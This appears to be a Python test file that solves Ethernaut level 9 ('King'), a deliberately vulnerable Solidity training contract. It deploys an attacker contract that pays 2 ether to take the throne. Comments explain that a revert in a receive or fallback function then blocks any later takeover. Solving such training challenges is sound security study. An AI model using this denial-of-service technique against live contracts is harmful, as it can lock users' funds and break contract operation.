from wake.testing import *
from tests.ethernaut_deployer import EthernautDeployer
from pytypes.contracts.lv09_king import King
from pytypes.contracts.attacker.lv09_eternal_king import EternalKing

@default_chain.connect()
def test_lv09():
    ethernaut = EthernautDeployer(default_chain)
    contract = ethernaut.deploy_lv09()
    newOwner = exploit_lv09(contract)
    ethernaut.check_lv09(contract, newOwner)

def exploit_lv09(contract: King) -> Address:
    # Attack vector: transaction can be reverted inside receive/fallback function
    # Training: you have to count on fact, that using transfer/send/call on external address can fail

    attacker = EternalKing.deploy()
    attacker.bribe(contract.address, value=2 * 10**18)
    return attacker.address
